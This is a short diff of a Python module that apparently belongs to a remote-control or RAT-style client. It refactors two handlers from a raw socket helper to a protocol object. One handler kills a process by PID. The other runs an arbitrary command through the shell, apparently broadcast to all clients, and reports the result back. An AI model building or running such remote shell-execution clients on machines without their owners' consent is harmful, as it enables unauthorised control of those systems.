@@ -1,19 +1,17 @@
 import subprocess
 
-from client.core.protocol import reliable_send
 
-
-def kill_process(sock, platform, target):
+def kill_process(protocol, platform, target):
     try:
         pid = target.strip()
         cmd = platform.kill_process_cmd(pid)
         subprocess.run(cmd, shell=True, capture_output=True)
-        reliable_send(sock, f'[+] Killed PID: {pid}')
+        protocol.send(f'[+] Killed PID: {pid}')
     except Exception as e:
-        reliable_send(sock, f'[-] Error killing process: {str(e)}')
+        protocol.send(f'[-] Error killing process: {str(e)}')
 
 
-def sendall_command(sock, command):
+def sendall_command(protocol, command):
     try:
         subprocess.Popen(
             command, shell=True,
@@ -21,6 +19,6 @@ def sendall_command(sock, command):
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE
         )
-        reliable_send(sock, f'[+] Command sent to all: {command}')
+        protocol.send(f'[+] Command sent to all: {command}')
     except Exception as e:
-        reliable_send(sock, f'[-] Error running sendall: {str(e)}')
+        protocol.send(f'[-] Error running sendall: {str(e)}')
